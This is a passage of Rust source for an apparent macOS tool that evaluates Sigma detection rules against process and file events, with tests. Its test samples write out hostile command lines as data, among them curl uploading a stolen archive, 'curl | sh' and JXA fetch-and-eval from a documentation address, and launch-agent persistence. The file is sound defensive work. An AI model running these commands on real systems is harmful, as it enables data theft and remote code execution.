        return Need::Any;
    };
    let Some(condition) = yaml["detection"]["condition"].as_str() else {
        return Need::Any;
    };
    let mut selections = BTreeMap::new();
    for (name, value) in detection {
        match name.as_str() {
            Some("condition") => {}
            Some(name) => {
                selections.insert(name.to_string(), selection_need(value, kind, texts));
            }
            None => return Need::Any,
        }
    }
    Condition::parse(condition, &selections).unwrap_or(Need::Any)
}

fn selection_need(value: &Value, kind: Kind, texts: &mut Wanted) -> Need {
    let map_need = |m: &serde_norway::Mapping, texts: &mut Wanted| {
        all(m
            .iter()
            .map(|(k, v)| match k.as_str() {
                Some(k) => field_need(k, v, kind, texts),
                None => Need::Any,
            })
            .collect())
    };
    match value {
        Value::Mapping(m) => map_need(m, texts),
        Value::Sequence(items) if !items.is_empty() && items.iter().all(Value::is_mapping) => {
            one_of(
                items
                    .iter()
                    .filter_map(Value::as_mapping)
                    .map(|m| map_need(m, texts))
                    .collect(),
            )
        }
        _ => Need::Any,
    }
}

fn field_need(key: &str, value: &Value, kind: Kind, texts: &mut Wanted) -> Need {
    let mut parts = key.split('|');
    let name = parts.next().unwrap_or_default();
    let mut every = false;
    // Whether the value's first run begins the field and its last ends it.
    let (mut start, mut end) = (true, true);
    for modifier in parts {
        match modifier.to_lowercase().as_str() {
            "contains" => (start, end) = (false, false),
            "startswith" => end = false,
            "endswith" => start = false,
            "cased" => {}
            "all" => every = true,
            _ => return Need::Any,
        }
    }
    // Numbered among every kind's fields, as `Subject::forms` lays out the values.
    let Some(field) = kind.fields().iter().position(|n| *n == name) else {
        return Need::Never;
    };
    let field = kind.offset() + field;
    let values: Vec<&Value> = match value {
        Value::Sequence(items) => items.iter().collect(),
        v => vec![v],
    };
    let needs = values
        .into_iter()
        .map(|v| match v {
            Value::String(s) => text_need(field, s, start, end, texts),
            _ => Need::Any,
        })
        .collect();
    if every { all(needs) } else { one_of(needs) }
}

/// What a value needs of a field: its longest run between wildcards and escapes within it,
/// its first run at the start when `start`, its last at the end when `end`, each folded. A run
/// that is empty needs nothing.
fn text_need(field: usize, value: &str, start: bool, end: bool, texts: &mut Wanted) -> Need {
    let runs: Vec<&str> = value.split(['*', '?', '\\']).collect();
    let longest = runs.iter().max_by_key(|run| run.chars().count());
    let mut wanted = |place: Place, run: Option<&&str>| match run {
        Some(run) if !run.is_empty() => {
            let next = texts.len();
            Need::Holds(*texts.entry((field, place, fold(run))).or_insert(next))
        }
        _ => Need::Any,
    };
    all(vec![
        wanted(Place::Within, longest),
        if start {
            wanted(Place::Start, runs.first())
        } else {
            Need::Any
        },
        if end {
            wanted(Place::End, runs.last())
        } else {
            Need::Any
        },
    ])
}

/// A rule's condition read for what it needs, by the evaluator's grammar: a selection by its
/// name, `1 of` or `all of` a name pattern or `them`, `not`, `and`, `or` and parentheses. Any
/// other word, or a condition left unread, gives `None`, and the rule needs nothing.
struct Condition<'a> {
    words: Vec<&'a str>,
    at: usize,
    selections: &'a BTreeMap<String, Need>,
}

impl<'a> Condition<'a> {
    fn parse(text: &'a str, selections: &'a BTreeMap<String, Need>) -> Option<Need> {
        // The evaluator's lexer counts characters where it cuts bytes, so it reads a condition
        // that is not ASCII otherwise than its words say.
        if !text.is_ascii() {
            return None;
        }
        let mut words = Vec::new();
        let mut start = None;
        for (i, c) in text.char_indices() {
            let cut = c == '(' || c == ')' || c.is_ascii_whitespace();
            match (cut, start) {
                (true, Some(s)) => {
                    words.push(&text[s..i]);
                    start = None;
                }
                (false, None) => start = Some(i),
                _ => {}
            }
            if c == '(' || c == ')' {
                words.push(&text[i..i + 1]);
            }
        }
        if let Some(s) = start {
            words.push(&text[s..]);
        }
        let mut c = Condition {
            words,
            at: 0,
            selections,
        };
        let need = c.or()?;
        (c.at == c.words.len()).then_some(need)
    }

    fn peek(&self) -> Option<String> {
        self.words.get(self.at).map(|w| w.to_ascii_lowercase())
    }

    fn next(&mut self) -> Option<&'a str> {
        let w = self.words.get(self.at).copied();
        self.at += 1;
        w
    }

    fn or(&mut self) -> Option<Need> {
        let mut parts = vec![self.and()?];
        while self.peek().as_deref() == Some("or") {
            self.at += 1;
            parts.push(self.and()?);
        }
        Some(one_of(parts))
    }

    fn and(&mut self) -> Option<Need> {
        let mut parts = vec![self.unary()?];
        while self.peek().as_deref() == Some("and") {
            self.at += 1;
            parts.push(self.unary()?);
        }
        Some(all(parts))
    }

    /// What stands under `not` needs nothing: its being false is not a text a start holds.
    fn unary(&mut self) -> Option<Need> {
        if self.peek().as_deref() == Some("not") {
            self.at += 1;
            self.unary()?;
            return Some(Need::Any);
        }
        self.primary()
    }

    fn primary(&mut self) -> Option<Need> {
        let word = self.next()?;
        match word.to_ascii_lowercase().as_str() {
            "(" => {
                let need = self.or()?;
                (self.next()? == ")").then_some(need)
            }
            q @ ("1" | "all") => {
                if !self.next()?.eq_ignore_ascii_case("of") {
                    return None;
                }
                let target = self.next()?;
                let them = target.eq_ignore_ascii_case("them");
                let every = q == "all";
                let named: Vec<Need> = if them {
                    self.selections.values().cloned().collect()
                } else if every {
                    // `all of` is held to names it surely covers: those that begin with what
                    // stands before its last `*`, read as it is written.
                    let prefix = target.strip_suffix('*')?;
                    self.selections
                        .iter()
                        .filter(|(n, _)| n.starts_with(prefix))
                        .map(|(_, need)| need.clone())
                        .collect()
                } else {
                    // `1 of` takes every name the pattern could cover.
                    self.selections
                        .iter()
                        .filter(|(n, _)| glob(target, n))
                        .map(|(_, need)| need.clone())
                        .collect()
                };
                if named.is_empty() {
                    return Some(Need::Any);
                }
                Some(if every { all(named) } else { one_of(named) })
            }
            _ => self.selections.get(word).cloned(),
        }
    }
}

/// Whether a name matches a pattern in which `*` stands for any run of characters.
fn glob(pattern: &str, name: &str) -> bool {
    match pattern.split_once('*') {
        None => pattern == name,
        Some((head, rest)) => {
            let Some(tail) = name.strip_prefix(head) else {
                return false;
            };
            (0..=tail.len())
                .filter(|i| tail.is_char_boundary(*i))
                .any(|i| glob(rest, &tail[i..]))
        }
    }
}

/// The texts the rules need, per field: one automaton that finds every text wanted within the
/// field in one pass, and the texts wanted at its start or end, each with its number.
struct Texts {
    count: usize,
    fields: Vec<FieldTexts>,
}

struct FieldTexts {
    within: Option<(aho_corasick::AhoCorasick, Vec<usize>)>,
    ends: Vec<(Place, String, usize)>,
}

impl Texts {
    /// `None` when an automaton cannot be built, and then every rule is asked.
    fn new(texts: Wanted) -> Option<Texts> {
        let mut fields = Vec::new();
        for field in 0..ALL_FIELDS {
            let mine = || texts.iter().filter(move |((f, _, _), _)| *f == field);
            let (needles, ids): (Vec<&String>, Vec<usize>) = mine()
                .filter(|((_, place, _), _)| *place == Place::Within)
                .map(|((_, _, text), id)| (text, *id))
                .unzip();
            // A DFA: a few hundred short texts make a small one, and it reads a long command
            // line several times faster than the default automaton.
            let within = if needles.is_empty() {
                None
            } else {
                let automaton = aho_corasick::AhoCorasick::builder()
                    .kind(Some(aho_corasick::AhoCorasickKind::DFA))
                    .build(&needles)
                    .ok()?;
                Some((automaton, ids))
            };
            let ends = mine()
                .filter(|((_, place, _), _)| *place != Place::Within)
                .map(|((_, place, text), id)| (*place, text.clone(), *id))
                .collect();
            fields.push(FieldTexts { within, ends });
        }
        Some(Texts {
            count: texts.len(),
            fields,
        })
    }

    /// Which texts the values of a start hold where they must, by their numbers. Every
    /// occurrence of every text within is reported, those inside another included, so a text
    /// is missed only if it is not there.
    fn held(&self, values: &[Option<String>]) -> Vec<bool> {
        let mut held = vec![false; self.count];
        for (value, field) in values.iter().zip(&self.fields) {
            let Some(value) = value else {
                continue;
            };
            let folded = fold(value);
            if let Some((automaton, ids)) = &field.within {
                for m in automaton.find_overlapping_iter(folded.as_str()) {
                    held[ids[m.pattern().as_usize()]] = true;
                }
            }
            for (place, text, id) in &field.ends {
                held[*id] = match place {
                    Place::Start => folded.starts_with(text.as_str()),
                    _ => folded.ends_with(text.as_str()),
                };
            }
        }
        held
    }
}

/// A rule is evaluated only with an id and a level, so that a match can be named and weighed.
fn meta(rule: &sigma_rust::Rule, yaml: &Value) -> Result<Meta, String> {
    // The evaluator refuses a level or status that is not Sigma's; it allows none.
    fn one_of<T: Copy>(table: &[(&str, T)], key: &str, yaml: &Value) -> Result<T, String> {
        let value = yaml[key].as_str();
        table
            .iter()
            .find(|(n, _)| Some(*n) == value)
            .map(|(_, v)| *v)
            .ok_or(format!("the rule has no {key}"))
    }
    let id = rule.id.clone().ok_or("the rule has no id")?;
    Ok(Meta {
        finding_rule: format!("{FINDING_PREFIX}{id}"),
        id,
        title: rule.title.clone(),
        level: one_of(&LEVELS, "level", yaml)?,
        status: one_of(&STATUSES, "status", yaml)?,
        author: rule.author.clone(),
        techniques: rule
            .tags
            .iter()
            .flatten()
            .filter_map(|t| t.strip_prefix("attack.t"))
            .map(|t| format!("T{t}"))
            .collect(),
        description: yaml["description"].as_str().map(str::to_string),
    })
}

/// Places a parsed rule. A selection is a map of fields, all of which must match, or a list of
/// such maps, one of which must. A map that names a field a program start does not give can
/// never match: the evaluator takes an absent field as not matching. If every map of some
/// selection is like that, the rule is not evaluated, whatever its condition says, since
/// reading the condition is the evaluator's. If only some maps are, the rest of each selection
/// still matches as the rule means, so the rule is evaluated in part and those maps are named.
fn place(yaml: &Value) -> Placement {
    let category = yaml["logsource"]["category"].as_str().unwrap_or_default();
    let Some(kind) = Kind::of(category) else {
        return Placement::NotEvaluated(Reason::NeedsEvents(category.to_string()));
    };
    let fields = kind.fields();
    let given = |f: &&str| fields.contains(f);
    let mut dead = Vec::new();
    let mut lacking_all = BTreeSet::new();
    let mut a_selection_is_dead = false;
    for (name, selection) in yaml["detection"].as_mapping().into_iter().flatten() {
        let Some(name) = name.as_str().filter(|n| *n != "condition") else {
            continue;
        };
        let maps: Vec<&serde_norway::Mapping> = match selection {
            Value::Mapping(m) => vec![m],
            Value::Sequence(items) if items.iter().all(Value::is_mapping) => {
                items.iter().filter_map(Value::as_mapping).collect()
            }
            _ => return Placement::NotEvaluated(Reason::KeywordSearch),
        };
        let mut alive = false;
        for map in maps {
            let lacking: BTreeSet<&str> = map
                .keys()
                .filter_map(Value::as_str)
                .filter_map(|k| k.split('|').next())
                .filter(|f| !given(f))
                .collect();
            if lacking.is_empty() {
                alive = true;
            } else {
                lacking_all.extend(lacking.iter().map(|f| f.to_string()));
                dead.push(Branch {
                    selection: name.to_string(),
                    fields: lacking.into_iter().map(str::to_string).collect(),
                });
            }
        }
        a_selection_is_dead |= !alive;
    }
    if a_selection_is_dead {
        Placement::NotEvaluated(Reason::NeedsFields(lacking_all.into_iter().collect()))
    } else if dead.is_empty() {
        Placement::Evaluated
    } else {
        Placement::InPart(dead)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn start(image: &str, args: &[&str], parent: &str) -> ProcessStart {
        ProcessStart {
            executable: image.to_string(),
            args: args.iter().map(|a| a.to_string()).collect(),
            parent_executable: Some(parent.to_string()),
            ..ProcessStart::default()
        }
    }

    /// A file created at `path`, or renamed there from `from`, by `image`.
    fn file(image: &str, path: &str, from: Option<&str>) -> FileEvent {
        FileEvent {
            timestamp: "2026-10-04T00:00:02.000002Z".into(),
            action: if from.is_some() { "rename" } else { "create" },
            path: path.into(),
            source: from.map(str::to_string),
            executable: image.into(),
        }
    }

    fn fired<'e>(rules: &Rules, s: impl Into<Subject<'e>>) -> Vec<String> {
        rules
            .evaluate(s)
            .iter()
            .map(|m| m.meta.id.clone())
            .collect()
    }

    fn fires<'e>(rules: &Rules, id: &str, s: impl Into<Subject<'e>>) -> bool {
        fired(rules, s).iter().any(|f| f == id)
    }

    fn by_id<'a>(rules: &'a Rules, id: &str) -> &'a Loaded {
        rules
            .rules
            .iter()
            .find(|l| l.meta.as_ref().is_some_and(|m| m.id == id))
            .unwrap_or_else(|| panic!("{id} is not shipped"))
    }

    const BINARY_PADDING: &str = "95361ce5-c891-4b0a-87ca-e24607884a96";
    const RENAMED_MESHAGENT: &str = "bd3b5eaa-439d-4a42-8f35-a49f5c8a2582";
    const BROWSER_CHILD: &str = "0250638a-2b28-4541-86fc-ea4c558fa0c6";
    const HIDDEN_USER: &str = "b22a5b36-2431-493a-8be1-0bae56c28ef3";
    const NETWORK_SCANNING: &str = "84bae5d4-b518-4ae0-b331-6d4afd34d00f";
    const FILE_DISCOVERY: &str = "089dbdf6-b960-4bcc-90e3-ffc3480c20f6";

    /// No false calm: every file in the folder is shipped, every shipped rule is placed as
    /// evaluated, evaluated in part or not evaluated with a reason, and the numbers add up to
    /// the files. A rule added to the folder and not to `SHIPPED` fails here, and so does one
    /// that changes the numbers, until someone looks at where it went.
    #[test]
    fn every_shipped_rule_is_accounted_for() {
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(FOLDER);
        let mut on_disk = BTreeSet::new();
        let mut dirs = vec![root.clone()];
        while let Some(dir) = dirs.pop() {
            for entry in std::fs::read_dir(&dir).unwrap() {
                let path = entry.unwrap().path();
                if path.is_dir() {
                    dirs.push(path);
                } else if path.extension().is_some_and(|e| e == "yml") {
                    let rel = path.strip_prefix(&root).unwrap();
                    on_disk.insert(rel.to_str().unwrap().to_string());
                }
            }
        }
        let shipped: BTreeSet<String> = SHIPPED.iter().map(|(p, _)| p.to_string()).collect();
        assert_eq!(on_disk, shipped, "the folder and the shipped list differ");
        for (path, text) in SHIPPED {
            let on_disk = std::fs::read_to_string(root.join(path)).unwrap();
            assert_eq!(&on_disk, text, "{path} is compiled in as it is on disk");
            let yaml: Value = serde_norway::from_str(text).unwrap();
            assert_eq!(
                yaml["logsource"]["product"].as_str(),
                Some("macos"),
                "{path}"
            );
        }

        let rules = Rules::shipped();
        let s = rules.summary_json();
        let t = &s["totals"];
        assert_eq!(t["shipped"], SHIPPED.len());
        assert_eq!(t["shipped"], 75);
        assert_eq!(
            (t["evaluated"].clone(), t["in_part"].clone()),
            (json!(74), json!(1))
        );
        assert_eq!(t["not_evaluated"], 0);
        let ids = |key: &str, events: &str| -> Vec<String> {
            let mut ids: Vec<String> = s[key]
                .as_array()
                .unwrap()
                .iter()
                .filter(|r| r["events"] == events)
                .map(|r| r["id_text"].as_str().unwrap().to_string())
                .collect();
            ids.sort();
            ids
        };
        assert_eq!(ids("evaluated", CATEGORY).len(), 69);
        assert_eq!(ids("in_part", CATEGORY), [RENAMED_MESHAGENT]);
        // The five rules for file events, each evaluated in full over files created or renamed.
        assert_eq!(ids("evaluated", FILE_CATEGORY), FILE_RULES);
        assert_eq!(
            (rules.evaluated(Kind::Process), rules.evaluated(Kind::File)),
            (69, 5)
        );
    }

    /// The shipped rules for file events, by id.
    const FILE_RULES: [&str; 5] = [
        "23c43900-e732-45a4-8354-63e4a6c187ce",
        "2db0458c-05c9-4069-a26f-77becd9c8c13",
        "4f394635-13ef-4599-b677-3353e0f84f55",
        "dfe8b941-4e54-4242-b674-6b613d521962",
        "e710a880-1f18-4417-b6a0-b5afdf7e3023",
    ];

    /// The Detection Rule License: the shipped rules carry the URI of the rule set and of the
    /// licence, and the commit they were copied at is the one the program reports.
    #[test]
    fn the_notice_names_the_source_the_commit_and_the_licence() {
        let notice = include_str!("../rules/sigma/NOTICE");
        assert!(notice.contains(SOURCE));
        assert!(notice.contains(COMMIT));
        assert!(notice.contains("https://github.com/SigmaHQ/Detection-Rule-License"));
        assert!(notice.contains("Detection Rule License (DRL) 1.1"));
    }

    /// The drill. Atomic Red Team's tests ffe2346c-abd5-4b45-a713-bf5f1ebd573a and
    /// e22a9e89-69c7-410f-a473-e6c212cd2292 (T1027.001), as `DRILL` writes their commands,
    /// each raise "Binary Padding - MacOS", and the summary says so; copying a file with `dd`
    /// and an ordinary `truncate` do not. A match carries what a finding will need, the rule's
    /// authors included.
    #[test]
    fn the_binary_padding_drill_fires_and_its_near_misses_do_not() {
        let rules = Rules::shipped();
        assert_eq!(DRILL_RULE, BINARY_PADDING);
        let tests: BTreeSet<&str> = DRILL.iter().map(|(t, _, _)| *t).collect();
        assert_eq!(
            tests,
            BTreeSet::from([
                "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
                "e22a9e89-69c7-410f-a473-e6c212cd2292"
            ])
        );
        for (_, image, args) in DRILL {
            assert!(
                fires(rules, BINARY_PADDING, &drill_start(image, args)),
                "{args:?}"
            );
        }
        let s = rules.summary_json();
        for d in s["drill"].as_array().unwrap() {
            assert_eq!(d["raised"], true, "{d}");
        }
        assert!(
            rules
                .summary_lines(None)
                .iter()
                .any(|l| l == "Drill, Atomic Red Team T1027.001: 4 of 4 program starts raise Binary Padding - MacOS.")
        );
        let truncate = drill_start("/usr/bin/truncate", DRILL[3].2);
        assert_eq!(
            s["drill"][3]["matches"],
            json!([{
                "file": "rules/macos/process_creation/proc_creation_macos_binary_padding.yml",
                "events": "process_creation",
                "id_text": BINARY_PADDING,
                "title_text": "Binary Padding - MacOS",
                "level": "high",
                "status": "test",
                "techniques": ["T1027.001"],
                "author_text": "Igor Fits, Mikhail Larin, oscd.community",
            }])
        );

        let copy = start("/bin/dd", &["dd", "if=a", "of=b"], "/bin/zsh");
        assert!(!fires(rules, BINARY_PADDING, &copy));
        let cut = start(
            "/usr/bin/truncate",
            &["truncate", "-s", "0", "f"],
            "/bin/zsh",
        );
        assert!(!fires(rules, BINARY_PADDING, &cut));

        let m = rules.evaluate(&truncate);
        let m = m.iter().find(|m| m.meta.id == BINARY_PADDING).unwrap();
        assert_eq!(m.meta.title, "Binary Padding - MacOS");
        assert_eq!(m.meta.level, Level::High);
        assert_eq!(m.meta.status, Status::Test);
        assert_eq!(m.meta.techniques, ["T1027.001"]);
        assert_eq!(
            m.meta.author.as_deref(),
            Some("Igor Fits, Mikhail Larin, oscd.community")
        );
        assert_eq!(
            m.file,
            "rules/macos/process_creation/proc_creation_macos_binary_padding.yml"
        );
    }

    /// For each rule that can raise a finding, by its id, a start it must fire on and a near
    /// miss it must stay silent on, written from what the rule describes.
    fn high_samples() -> Vec<(&'static str, ProcessStart, ProcessStart)> {
        vec![
            (
                // Amos: curl posting the archive it collected, with its build headers.
                "e710a880-1f18-4417-b6a0-b5afdf7e33da",
                start(
                    "/usr/bin/curl",
                    &[
                        "curl",
                        "-X",
                        "POST",
                        "-H",
                        "user: 7f3a",
                        "-H",
                        "BuildID: c0ffee",
                        "-H",
                        "cl: 0",
                        "--max-time",
                        "300",
                        "-F",
                        "file=@/tmp/out.zip",
                        "http://192.0.2.10/contact",
                    ],
                    "/bin/sh",
                ),
                // An ordinary upload of a zip with curl.
                start(
                    "/usr/bin/curl",
                    &[
                        "curl",
                        "-X",
                        "POST",
                        "-F",
                        "file=@/tmp/report.zip",
                        "https://example.invalid/upload",
                    ],
                    "/bin/zsh",
                ),
            ),
            (
                // Axios npm compromise: the dropper starts its AppleScript in the background.
                "a09ee860-31b3-4586-8a68-0ebd74ce0e5f",
                start(
                    "/bin/sh",
                    &[
                        "sh",
                        "-c",
                        "nohup osascript /tmp/6202033 > /dev/null 2>&1 &",
                    ],
                    "/usr/local/bin/node",
                ),
                // Cleaning a build folder.
                start("/bin/rm", &["rm", "-rf", "/tmp/build-cache"], "/bin/zsh"),
            ),
            (
                BINARY_PADDING,
                start(
                    "/bin/dd",
                    &["dd", "if=/dev/urandom", "bs=1", "count=1"],
                    "/bin/sh",
                ),
                start(
                    "/bin/dd",
                    &["dd", "if=disk.img", "of=/dev/rdisk9", "bs=1m"],
                    "/bin/zsh",
                ),
            ),
            (
                // Searching files for passwords with grep.
                "53b1b378-9b06-4992-b972-dde6e423d2b4",
                start(
                    "/usr/bin/grep",
                    &["grep", "-ri", "password", "/tmp/notes"],
                    "/bin/zsh",
                ),
                start("/usr/bin/grep", &["grep", "-r", "TODO", "src"], "/bin/zsh"),
            ),
            (
                // A Word macro starting a shell.
                "69483748-1525-4a6c-95ca-90dc8d431b68",
                start(
                    "/bin/sh",
                    &["sh", "-c", "curl -s http://192.0.2.10/a | sh"],
                    "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
                ),
                // A shell starting a shell in a terminal.
                start("/bin/sh", &["sh", "-c", "ls"], "/bin/zsh"),
            ),
            (
                // JXA fetching and evaluating a script in memory.
                "f1408a58-0e94-4165-b80a-da9f96cf6fc3",
                start(
                    "/usr/bin/osascript",
                    &[
                        "osascript",
                        "-l",
                        "JavaScript",
                        "-e",
                        "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://192.0.2.10/p')),$.NSUTF8StringEncoding)))",
                    ],
                    "/bin/zsh",
                ),
                // JXA asking Finder for its name.
                start(
                    "/usr/bin/osascript",
                    &[
                        "osascript",
                        "-l",
                        "JavaScript",
                        "-e",
                        "Application('Finder').name()",
                    ],
                    "/bin/zsh",
                ),
            ),
            (
                // PlistBuddy making a launch agent run at load.
                "65d506d3-fcfe-4071-b4b2-bcefe721bbbb",
                start(
                    "/usr/libexec/PlistBuddy",
                    &[
                        "PlistBuddy",
                        "-c",
                        "Add :RunAtLoad bool true",
                        "/tmp/home/Library/LaunchAgents/com.example.agent.plist",
                    ],
                    "/bin/sh",
                ),
                // Turning it off again.
                start(
                    "/usr/libexec/PlistBuddy",
                    &[
                        "PlistBuddy",
                        "-c",
                        "Set :RunAtLoad false",
                        "/tmp/home/Library/LaunchAgents/com.example.agent.plist",
                    ],
                    "/bin/sh",
                ),
            ),
            (
                // A run-only script compiled from a one-liner.
                "b9d9b652-d8ed-4697-89a2-a1186ee680ac",
                start(
                    "/usr/bin/osacompile",
                    &[
                        "osacompile",
                        "-x",
                        "-e",
                        "do shell script \"id\"",
                        "-o",
                        "/tmp/a.scpt",
                    ],
                    "/bin/sh",
                ),
                // An ordinary compile that keeps the source.
                start(
                    "/usr/bin/osacompile",
                    &["osacompile", "-o", "/tmp/a.scpt", "/tmp/a.applescript"],
                    "/bin/zsh",
                ),
            ),
            (
                // MeshAgent renamed, still given its service name.
                RENAMED_MESHAGENT,
                start(
                    "/tmp/.helper",
                    &["/tmp/.helper", "--meshServiceName", "Support"],
                    "/bin/sh",
                ),
                // MeshAgent under its own name.
                start(
                    "/opt/mesh/meshagent",
                    &["/opt/mesh/meshagent", "--meshServiceName", "Support"],
                    "/sbin/launchd",
                ),
            ),
            (
                // A bash one-liner cutting base64 out of an image and decoding it.
                "09a910bf-f71f-4737-9c40-88880ba5913d",
                start(
                    "/bin/bash",
                    &[
                        "/bin/bash",
                        "-c",
                        "tail -c +21453 '/Volumes/Installer/logo.jpeg' | base64 --decode > /tmp/x.zip",
                    ],
                    "/bin/sh",
                ),
                // The same from a text file.
                start(
                    "/bin/bash",
                    &[
                        "/bin/bash",
                        "-c",
                        "tail -c +100 notes.txt | base64 --decode > /tmp/x.bin",
                    ],
                    "/bin/sh",
                ),
            ),
            (
                // WizardUpdate: sh evaluating what curl fetched.
                "f68c4a4f-19ef-4817-952c-50dce331f4b0",
                start(
                    "/bin/sh",
                    &[
                        "sh",
                        "-c",
                        "s=$(curl -fsL http://192.0.2.10/i); eval \"$s\"",
                    ],
                    "/bin/bash",
                ),
                // sh keeping what curl fetched without running it.
                start(
                    "/bin/sh",
                    &[
                        "sh",
                        "-c",
                        "v=$(curl -fsL https://example.invalid/version); echo $v",
                    ],
                    "/bin/bash",
                ),
            ),
        ]
    }

    const AMOS_FILES: &str = "e710a880-1f18-4417-b6a0-b5afdf7e3023";
    const AXIOS_FILES: &str = "2db0458c-05c9-4069-a26f-77becd9c8c13";

    /// The same for the rules for file events, a file event each, as Endpoint Security gives
    /// paths: resolved, `/private/tmp` for `/tmp`.
    fn file_high_samples() -> Vec<(&'static str, FileEvent, FileEvent)> {
        vec![
            (
                // Amos: its launch daemon renamed into place. Where it went is the target.
                AMOS_FILES,
                file(
                    "/bin/mv",
                    "/Library/LaunchDaemons/com.finder.helper.plist",
                    Some("/private/tmp/7f3a.plist"),
                ),
                // The same file renamed away: where it came from is not the target.
                file(
                    "/bin/mv",
                    "/private/tmp/7f3a.plist",
                    Some("/Library/LaunchDaemons/com.finder.helper.plist"),
                ),
            ),
            (
                // Axios: node writes the dropper to /tmp, which macOS resolves to /private/tmp.
                AXIOS_FILES,
                file("/usr/local/bin/node", "/private/tmp/6202033", None),
                file("/usr/local/bin/node", "/private/tmp/6202034", None),
            ),
        ]
    }

    /// Every rule that can raise a finding, high or critical and evaluated, has one event it
    /// must fire on and one near miss it must stay silent on, written from what the rule
    /// describes. A new such rule without samples fails here.
    #[test]
    fn every_high_rule_fires_on_its_sample_and_not_on_its_near_miss() {
        let rules = Rules::shipped();
        let samples = high_samples();
        let files = file_high_samples();
        let high: BTreeSet<&str> = rules
            .rules
            .iter()
            .filter(|l| !matches!(l.placement, Placement::NotEvaluated(_)))
            .filter_map(|l| l.meta.as_ref())
            .filter(|m| m.level >= Level::High)
            .map(|m| m.id.as_str())
            .collect();
        let sampled: BTreeSet<&str> = samples
            .iter()
            .map(|(id, _, _)| *id)
            .chain(files.iter().map(|(id, _, _)| *id))
            .collect();
        assert_eq!(
            high, sampled,
            "every high rule that is evaluated has samples"
        );
        for (id, hit, miss) in &samples {
            assert!(fires(rules, id, hit), "{id} fires on its sample");
            assert!(
                !fires(rules, id, miss),
                "{id} stays silent on its near miss"
            );
        }
        for (id, hit, miss) in &files {
            assert!(fires(rules, id, hit), "{id} fires on its sample");
            assert!(
                !fires(rules, id, miss),
                "{id} stays silent on its near miss"
            );
        }
    }

    /// A rule's author writes `/tmp/x`; Endpoint Security gives `/private/tmp/x`, the path it
    /// resolved through the link every Mac has. The file is known by both names, so the rule
    /// sees it, and a rule written with `/private/var` still sees the path as given. Nothing
    /// else is a name of it: a folder that merely ends in `private` gives no second name.
    #[test]
    fn a_file_is_known_by_its_path_and_through_macos_links_into_private() {
        let rules = Rules::shipped();
        let node = "/usr/local/bin/node";
        assert!(fires(
            rules,
            AXIOS_FILES,
            &file(node, "/private/tmp/6202033", None)
        ));
        assert!(fires(rules, AXIOS_FILES, &file(node, "/tmp/6202033", None)));
        let emond = "23c43900-e732-45a4-8354-63e4a6c187ce";
        let client = file("/bin/cp", "/private/var/db/emondClients/x", None);
        assert!(fires(rules, emond, &client));
        let names = |p: &str| -> Vec<String> {
            file("/bin/cp", p, None)
                .names()
                .iter()
                .map(|n| n.to_string())
                .collect()
        };
        assert_eq!(
            names("/private/etc/emond.d/rules/a.plist"),
            [
                "/private/etc/emond.d/rules/a.plist",
                "/etc/emond.d/rules/a.plist"
            ]
        );
        assert_eq!(names("/private/var/x"), ["/private/var/x", "/var/x"]);
        assert_eq!(names("/Users/x/private/tmp/a"), ["/Users/x/private/tmp/a"]);
        assert_eq!(names("/private/tmpx/a"), ["/private/tmpx/a"]);
        assert_eq!(names("/private/Users/a"), ["/private/Users/a"]);
    }

    /// A start whose message names no program before the `exec` gives no `ParentImage`: the
    /// field is absent, not empty, so a rule asking for an empty parent does not take it for
    /// one.
    #[test]
    fn a_parent_the_start_does_not_give_is_absent_not_empty() {
        let rules = Rules::load(&[(
            "empty-parent.yml",
            invented("    selection:\n        ParentImage: ''\n    condition: selection\n"),
        )]);
        let mut s = start("/bin/x", &["x"], "");
        assert_eq!(rules.evaluate(&s).len(), 1);
        s.parent_executable = None;
        assert!(rules.evaluate(&s).is_empty());
    }

    /// How sure a finding from a published rule is follows the rule's status: a high match of
    /// a rule SigmaHQ calls stable is urgent, one of a rule still in test or experimental is
    /// not, and no published rule is ever sure, since none was tuned to this Mac.
    #[test]
    fn only_a_stable_rule_s_high_match_is_urgent_and_none_is_sure() {
        for (status, urgent) in [
            (Status::Stable, true),
            (Status::Test, false),
            (Status::Experimental, false),
        ] {
            let sure = Some(status.confidence());
            assert_eq!(crate::findings::urgent("high", sure), urgent, "{status:?}");
        }
        assert!(STATUSES.iter().all(|(_, s)| s.confidence() != "high"));
    }

    /// The command line is the arguments joined by single spaces, the first included, so a
    /// rule that reads two arguments as one string, "-s +", sees them; the same written as one
    /// argument is another command line, and the rule does not see it.
    #[test]
    fn the_command_line_is_the_arguments_joined_by_spaces() {
        let s = start(
            "/usr/bin/truncate",
            &["truncate", "-s", "+1", "f"],
            "/bin/sh",
        );
        let (_, command_line) = FIELDS.iter().find(|(n, _)| *n == "CommandLine").unwrap();
        assert_eq!(command_line(&s).as_deref(), Some("truncate -s +1 f"));
        let rules = Rules::shipped();
        assert!(fires(rules, BINARY_PADDING, &s));
        let glued = start("/usr/bin/truncate", &["truncate", "-s+1", "f"], "/bin/sh");
        assert!(!fires(rules, BINARY_PADDING, &glued));
    }

    /// Sigma's values are case-insensitive, and macOS's default file system is too, so
    /// `/BIN/DD` runs `dd`: the evaluator folds case for `endswith`, `contains` and plain
    /// equality alike.
    #[test]
    fn values_match_whatever_their_case() {
        let rules = Rules::shipped();
        let shouted = start("/BIN/DD", &["DD", "IF=/DEV/ZERO"], "/bin/sh");
        assert!(fires(rules, BINARY_PADDING, &shouted));
        let find = start("/USR/BIN/FIND", &["find", "."], "/bin/zsh");
        assert!(fires(rules, FILE_DISCOVERY, &find));
        // `endswith: '/dd'` holds the slash: another program whose name ends in dd is not dd.
        let gdd = start("/usr/local/bin/gdd", &["gdd", "if=/dev/zero"], "/bin/sh");
        assert!(!fires(rules, BINARY_PADDING, &gdd));
    }

    /// Regular expressions are case-sensitive, as the specification says, unlike every other
    /// value: the scanning rule leaves `nc -l`, a listener, to its filter, and `nc -L` is not
    /// one.
    #[test]
    fn regular_expressions_keep_case() {
        let rules = Rules::shipped();
        let listen = start("/usr/bin/nc", &["nc", "-l", "8080"], "/bin/zsh");
        assert!(!fires(rules, NETWORK_SCANNING, &listen));
        let upper = start("/usr/bin/nc", &["nc", "-L", "8080"], "/bin/zsh");
        assert!(fires(rules, NETWORK_SCANNING, &upper));
    }

